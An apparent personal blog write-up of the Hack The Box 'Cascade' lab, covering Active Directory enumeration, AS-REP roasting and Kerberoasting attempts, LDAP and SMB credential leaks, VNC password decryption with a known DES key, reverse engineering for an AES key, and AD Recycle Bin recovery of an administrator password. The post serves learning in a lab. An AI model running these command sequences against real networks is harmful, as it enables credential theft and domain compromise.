---
layout: post
title:  "Cascade Writeup - Hack The Box"
date:   2025-08-31
desc: ""
keywords: "HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,RPC,Kerbrute,ASREPRoast Attack,LDAP,SMB,Cracking,TightVNC,Kerberoasting Attack,SQLite3,Windows EXE binary Analysis,DotPeek,Reverse Engineering,AD Recycle Bin Group,Medium"
categories: [HTB]
tags: [HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,RPC,Kerbrute,ASREPRoast Attack,LDAP,SMB,Cracking,TightVNC,Kerberoasting Attack,SQLite3,Windows EXE binary Analysis,DotPeek,Reverse Engineering,AD Recycle Bin Group,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue with my saga of **Windows** machines, this time it touches a machine that for me was **Insane** for the total ignorance I had about the **vulnerabilities**, **techniques** and **tools** that I had to investigate to be able to use all this information and thus advance **very slowly** to finally reach the goal of **Engaging** the machine. With all this introduction I think that my assessment regarding the complexity of the **Cascade** machine differs greatly to the rest of the community which rated as **Medium**. I learned a lot, I had even more fun and I have gained an immeasurable amount of knowledge and new techniques that I will add to my methodology, which I have been improving little by little. I just sign in to my account and spawn the machine to start my writeup.

<br /><br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before even starting the most crucial phase of any **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** lab I face, I test by sending a trace to the box with `ping` to check my connectivity to it. I also resort to **[hack4u's](https://hack4u.io/){:target="_blank"}** `whichSystem.py` tool to measure with some degree of certainty that the machine's OS is **Windows**. Now if I can start the **Reconnaissance** phase, first I list the open ports with `nmap`, using first the **TCP SYN scan** option, and the next thing I do is to take advantage of the custom scripts of the same tool to leak all the possible information of the services and their versions, associated to the open ports found. I find a lot of very important information, the most relevant is that I'm in front of an **Active Directory** and I can already know the **Domain name**, also protocols such as **Kerberos** or **LDAP** that are usually found in an **AD environment** are accessible. With `crackmapexec` I can know more about the **SMB** protocol and also get information from the **OS**, I also corroborate that **the protocol is signed** which would not allow me to perform a **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. With `dig` I try to leak **DNS** protocol information (**port 53**), but I don't succeed even with an **AXFR** attack.

> **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**: This attack uses the **Responder** toolkit to capture **SMB** authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.

> **[SMB-Scanning](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker **impersonates** the user to gain unauthorized access.

```bash
ping -c 2 10.10.10.182
whichSystem.py 10.10.10.182
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.182 -oG allPorts
nmap -sCV -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49165 10.10.10.182 -oN targeted
cat targeted
# DNS, Kerberos, LDAP, SMB, WinRM
# Domain: cascade.local

crackmapexec smb 10.10.10.182

dig @10.10.10.182
dig @10.10.10.182 ns
dig @10.10.10.182 mx
dig @10.10.10.182 axfr
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I will add the domain name to my **hosts** file so that the system can correctly resolve to the real **IP** of the machine later. Maybe with the changes made above I will have better luck enumerating the **DNS** protocol with `dig`, but the results are still the same even when I use the **IP** along with the **domain name**. I try to enumerate the shares through the **SMB** protocol, with tools like `smbclient` or `smbmap` I'm not allowed because I don't have credentials to authenticate.

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
cat /etc/hosts | tail -n 1 | awk 'NF{print $NF}' | xargs ping -c 1

dig @10.10.10.182 cascade.local
dig @10.10.10.182 cascade.local ns
dig @10.10.10.182 cascade.local mx
dig @10.10.10.182 cascade.local axfr

smbclient -L 10.10.10.182 -N
smbmap -H 10.10.10.182 -u 'null' --no-banner
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My next protocol to investigate is **Windows RPC** (port **135**) and this time I have better luck as I can enumerate the groups, users and metadata of the domain accounts. With all the available information I'm going to create a custom dictionary of the user names to first use **[ropnop's](https://github.com/ropnop/kerbrute){:target="_blank"}** `kerbrute` tool to check if they are valid. I get the result that all accounts are valid, which seems to be the most obvious because the list I passed to `kerbrute` is a direct leak from the **AD**. I'm going to try to perform an **AS-REPRoast Attack** with `impacket-GetNPUsers` but all the accounts have the **DONT_REQUIRE_PREAUTH** disabled so I can't leak any hashes. I also have no luck with `impacket-GetUserSNPs` performing a **Kerberoasting Attacking** to get some **TGT** that I can crack offline.

> **[kerbrute](https://github.com/ropnop/kerbrute){:target="_blank"}**: A tool to quickly bruteforce and enumerate valid **Active Directory accounts** through **Kerberos Pre-Authentication**.

> **[Impacket’s GetNPUsers.py](https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/){:target="_blank"}** will attempt to harvest the **non-preauth AS_REP responses** for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.

> **[Impacket’s GetUserSPNs.py](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/){:target="_blank"}** will attempt to fetch **Service Principal Names** that are associated with normal user accounts. What is returned is a **ticket** that is encrypted with the user account’s password, which can then be bruteforced offline.

```bash
rpcclient -U "" 10.10.10.182 -N
  enumdomusers
  enumdomgroups

rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers'
rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers' | awk '{print $1}' FS=' '
rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers' | awk '{print $1}' FS=' ' | awk '{print $2}' FS=':' | tr -d '[]'
rpcclient -U "" 10.10.10.182 -N -c 'enumdomusers' | awk '{print $1}' FS=' ' | awk '{print $2}' FS=':' | tr -d '[]' > Users.txt

kerbrute userenum -d cascade.local --dc 10.10.10.182 Users.txt

impacket-GetNPUsers CASCADE.LOCAL/ -no-pass -usersfile Users.txt -dc-ip 10.10.10.182

impacket-GetUserSPNs CASCADE.LOCAL/ -usersfile Users.txt -no-pass -dc-ip 10.10.10.182 -no-preauth NO_PREAUTH -request
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to find any misconfiguration, vulnerability or leakage of sensitive information, any possible attack vector is to **try harder** and continue with the other protocol, **LDAP**. I count on the `ldapsearch` tool and perform an enumeration, but being careful to use the correct parameters and enter the values correctly, after trying several times I get the tool to run and start my search by leaking the results with `grep` until I find a **Base64** encoded password. After decoding it with `base64`, I validate with `crackmapexec` using the **SMB** protocol that the credentials are correct but unfortunately it also informs me that I cannot use the **WinRM** protocol to connect to the system. I try again to list the shared resources with `smbclient` and `smbmap`, but this time with better results as I find a lot of information available on one of the shares.

> `ldapsearch` opens  a connection to an **LDAP server**, binds, and performs a search using specified parameters.

```bash
man ldapsearch

ldapsearch --help
# -b basedn  base dn for search
# -x         Simple authentication
# -H URI     LDAP Uniform Resource Identifier(s)

ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
ldapsearch -x -H 10.10.10.182 -b "dc=cascade.local,dc=local"
# :(
ldapsearch -x -H "ldap://10.10.10.182" -b "dc=cascade,dc=local"
# :)

ldapsearch -x -H "ldap://10.10.10.182" -b "dc=cascade,dc=local" | grep "@cascade.local"
ldapsearch -x -H "ldap://10.10.10.182" -b "dc=cascade,dc=local" | grep "@cascade.local" -A 20
# userPrincipalName: r.thompson@cascade.local
# cascadeLegacyPwd: clk0bjVldmE=

echo "c...=" | base64 -d; echo
crackmapexec smb 10.10.10.182 -u 'r.thompson' -p 'r...a'
crackmapexec winrm 10.10.10.182 -u 'r.thompson' -p 'r...a'

smbclient -L 10.10.10.182 -U 'r.thompson%r...a'
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'r...a' --no-banner
smbclient //10.10.10.182/Data -U 'r.thompson'
  dir
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since the information is overwhelming and using `smbclient` can be counterproductive in terms of access time, I will set up a **CIFS** like mount to access the share as if it were a part of my local file system. After entering the credentials that I managed to leak with `ldapsearch` and also enable read and write (**rw**) permissions and my investigation begins. I find several logs related to **Ark AD Recycle Bin** (deleted object recovery) and **DcDiag** (**AD** diagnostics) in which I find user accounts but still nothing very relevant. What I do find interesting is an **.html** file related to a meeting, that once downloaded on my machine I can access its content from the browser directly (starting a local server with `php`) that informs me of an existing administrator account (**TempAdmin**). I continue with my search in the logs, where I find some moderately interesting paths, but finally in the temporary directory of the **s.smith** account there is a **Windows Registry** file that surely are the installation settings of the **[VNC](https://dexonsystems.com/blog/what-is-vnc){:target="_blank"}** application, in which there is a password in **Hexadecimal** format.

> **[VNC](https://dexonsystems.com/blog/what-is-vnc){:target="_blank"}** is short for **Virtual Network Computing** and is a screen-sharing system that is used across different platforms. It was designed to allow users to remotely control another computer from almost any location, meaning that a computer’s screen, keyboard, and mouse can be used separately.

```bash
smbclient //10.10.10.182/Data -U 'r.thompson'

pushd /mnt
mkdir SMBCascade
mount -t cifs //10.10.10.182/DATA /mnt/SMBCascade -o username=r.thompson,password=r...a,domain=cascade.local,rw
cd ./SMBCascade
tree -fas

cat "./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log"
cat ./IT/Logs/DCs/dcdiag.log

cp "./IT/Email Archives/Meeting_Notes_June_2018.html" /home/al3j0/Documents/HackTheBox/Windows/Cascade/content/index.html

php -S 0.0.0.0:80
# http://localhost/

cat "./IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log"
# Moving object to AD recycle bin CN=TempAdmin
file "./IT/Temp/s.smith/VNC Install.reg"
# Windows Registry
cat "./IT/Temp/s.smith/VNC Install.reg"
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I decode the password I found with `xxd`, but the content seems to be **encrypted**, again I must resort to my researcher side to search the **Internet** for vulnerabilities or exploits to try to crack the password. I'm lucky because it does not demand me much time and I find a repository in **Github** of **[billchaison](https://github.com/billchaison/VNCDecrypt){:target="_blank"}** in which I find an oneliner that uses `openssl` to decrypt the **VNC** passwords. I adjust the command and this way I get in plain text the password, I immediately validate the credential with `crackmapexec`, which I also use to inform me that I can access the system through **WinRM**. Once I connect to the box with `evil-winrm` the enumeration phase starts, I can also access the first flag, but I don't count special privileges besides not being able to access certain directories.

> **VNC** stores passwords as a **hex** string in **.vnc** files using a default encryption key. `openssl` one-liner can be used to decrypt the string.

> **Attacker Machine**:

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ','
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r > password.txt
cat password.txt

file password.txt

umount SMBCascade

echo -n 6b...0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv

crackmapexec smb 10.10.10.182 -u Users.txt -p 's...2'
crackmapexec winrm 10.10.10.182 -u 's.smith' -p 's...2'

gem install evil-winrm
evil-winrm -i 10.10.10.182 -u 's.smith' -p 's...2'
```

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
whoami /priv
whoami /all

cd arksvc
cd ..\Administrator
dir
# :(
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I use `net` to search for information on the compromised **s.smith** account I find that it belongs to some special groups like **Audit Shace** or **IT**, so my instinct tells me that I could follow my search for information in the metadata of these groups. Just by searching in the first one I find in the **Comment** attribute information of a shared resource to which I did not have access before, and indeed in the **Shares** folder of the file system I find several files of an **.exe** application, but also a **.db** file corresponding to a **SQLite** database that I immediately download in my attacking machine. With `file` I finish confirming that it is a **SQLite** file.

> **[SQLite](https://www.sqlite.org/about.html){:target="_blank"}** is an in-process library that implements a self-contained, serverless, zero-configuration, **transactional SQL database engine**. The code for **SQLite** is in the public domain and is thus free for use for any purpose, commercial or private. **SQLite** is the most widely deployed database in the world with more applications than we can count, including several high-profile projects.

> **Victime Machine**:

```cmd
net user s.smith
# Local Group Memberships      *Audit Share          *IT

net localgroup Audit Share
net localgroup "Audit Share"
# Comment        \\Casc-DC1\Audit$

cd C:\Shares\Audit\DB
download Audit.db
```

> **Attacker Machine**:

```bash
file Audit.db
SQLite 3.x database
```
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I didn't realize that I could have avoided this information search, if before accessing the machine I had used `smbclient` to enumerate the shared resources using the **s.smith** account credentials. But now I'm going to take the opportunity to directly download the entire contents of the **Audit** share (which includes the **.db file**). With `sqlite3` I can **[access the information of the database](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html?highlight=sqlite3#pgadmin){:target="_blank"}** that I downloaded and in it I find related to the **LDAP** protocol, so surely there are stored credentials. After entering some commands I find the **TempAdmin** account password encoded in **Base64**, but if I decode it with `base64` the content is unreadable, a sign that it is **encrypted**.

```bash
smbclient -L 10.10.10.182 -U 's.smith%s...2'
smbmap -H 10.10.10.182 -u 's.smith' -p 's...2' --no-banner
smbclient //10.10.10.182/Audit$ -U 's.smith%s...2'
  prompt off
  recurse ON
  get *
# :(
  mget *

sqlite3 Audit.db
  .tables
  .schema
  select * from DeletedUserAudit;
  select * from Ldap;
  .exit

echo BQ...w== | base64 -d; echo
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I found the **database** together with the files that correspond to the `CascAudit.exe` application, it is very likely that the **.db file** is linked directly to this tool so I will use my **Virtual Machine** to decompile the program with **[dotPeek](https://www.jetbrains.com/decompiler/){:target="_blank"}** to perform **Reverse Engineering**, maybe I will be lucky and find the functions that are responsible for decrypting the password I found. I just have to transfer the binary to my **VM**, after opening it with **[dotPeek](https://www.jetbrains.com/decompiler/){:target="_blank"}**, it takes care of the decompilation and in the **Main Module** I find very important information such as the name of the library in charge of encrypting strings (**CascCrypto**) plus what seems to be the **key** that many encryption algorithms usually use.

> **[dotPeek](https://www.jetbrains.com/decompiler/){:target="_blank"}** is a free **.NET decompiler** and **assembly browser**. The main idea behind **dotPeek** is to make high-quality decompiling available to everyone in the **.NET** community, free of charge. **dotPeek** decompiles any **.NET** assemblies and presents them as **C#** or **IL** code.

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Virtual Machine - Windows 10**:

```html
# File --> Open   [CascAudit.exe]
# CascAudit --> CascAudit --> MainModule
# string str2 = Conversions.ToString(sqLiteDataReader["Pwd"]);
# str1 = Crypto.DecryptString(str2, "c4...21");                   [Crypto <-- Library?]
# using CascCrypto;                                               [Library?]
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is time to transfer the **CascCrypto.dll** library to the virtual machine to **Reverse engineer** this file. After opening it with **dotPeek**, I also find in the **Main Module** all the information of the algorithm used to encrypt strings, corresponding to **AES-128-CBC** (**Cipher Block Chaining**). With all the data I find I can use the excellent online tool **[CyberChef](https://gchq.github.io/CyberChef/){:target="_blank"}** to try to decrypt the password I found in previous steps of the machine engagement. I just have to carefully enter all the values, plus some trial and error techniques with the types of **Coding** to use, and finally the tool succeeds in decrypting the string I entered. With `crackmapexec` I verify that the password is correct and I can also access with `evil-winrm` achieving a User Pivoting.

> **Attacker Machine**:

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```html
# File --> Open   [CascCrypto.dll]
# CascCrypto --> CascCrypto --> Crypto
# aes.BlockSize = 128;
#       aes.KeySize = 128;
#       aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
#       aes.Key = Encoding.UTF8.GetBytes(Key);
#       aes.Mode = CipherMode.CBC;
```

> **Attacker Machine**:

```bash
cat ArkSvc_hash
cat ArkSvc_hash | base64; echo

# CyberChef
# From Base64 --> AES Decrypt
# Key: c4...21 [UTF8]
# IV: 1t...42 [UTF8]
# Mode: CBC
# Input: Raw
# Output: Raw

crackmapexec smb 10.10.10.182 -u ArkSvc -p w...d
crackmapexec winrm 10.10.10.182 -u ArkSvc -p w...d
evil-winrm -i 10.10.10.182 -u ArkSvc -p w...d
```

> **Victime Machine**:

```cmd
whoami
hostname
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the first enumeration commands in the shell of the last compromised account I notice some very interesting data, as the user belongs to the **AD Recycle Bin** and **IT** group. The first group is the one I'm most interested in so I try to get as much information as possible about it but I'm also going to investigate on the **Internet** some vulnerability or some way to **Escalate Privileges**.

```bash
whoami /priv
whoami /all
# CASCADE\AD Recycle Bin

net user arksvc
# Local Group Memberships      *AD Recycle Bin       *IT

net localgroup "AD Recycle Bin"
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With my research I was able to find a very interesting article that will surely help me in my goal, **[“Active Directory Object Recovery Using the Recycle Bin”](https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/){:target="_blank"}**. In which explains that it is possible to recover deleted objects from the **DC** using the **[Get-ADObject module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adobject?view=windowsserver2025-ps){:target="_blank"}**, so I begin my task of adjusting the **oneliner** to start getting sensitive information from the system, with the **-properties** parameter I get access to a **Base64** encoded password whose **CN** (**Common Name**) is **TempAdmin**. After decoding the string with `base64`, I find the password which turns out to be that of the **Administrator** account, as reported to me by `crackmapexec`. I can now access the machine with `evil-winrm` and finish the **Engagement** of the **Cascade** machine.

> The **[Active Directory Recycle Bin](https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/){:target="_blank"}** enables users to **recover deleted Active Directory objects** without having to restore them from backup, restart Active Directory Domain Services or reboot domain controllers (**DCs**).

> **Victime Machine**:

```cmd
Get-ADObject -Filter Deleted -eq $True -IncludeDeletedObjects

Get-ADObject -Filter 'Deleted -eq $True' -IncludeDeletedObjects
Get-ADObject -Filter 'Deleted -eq $True' -IncludeDeletedObjects -properties *
```

> **Attacker Machine**:

```bash
echo Ym...Vz | base64 -d; echo

crackmapexec smb 10.10.10.182 -u TempAdmin -p b...s

crackmapexec smb 10.10.10.182 -u Administrator -p b...s
crackmapexec winrm 10.10.10.182 -u Administrator -p b...s

evil-winrm -i 10.10.10.182 -u Administrator -p b...s
```

<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another very interesting **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** box that I successfully managed to engage but with a lot of **effort**, **research**, **time** and various vulnerability exploitation **techniques** applied, which in many cases were not successful but helped me to find the right attack vectors. I was also able to reuse some online tools that always helped me in various **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines and challenges on other platforms or even in **CTFs** at conferences. I had a lot of fun, learned several new concepts and am still focused on my **learning strategy**. Now I just have to kill the **Cascade** box and go for the next challenge.

<br /><br />
<img src="{{ site.img_path }}/cascade_writeup/Cascade_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
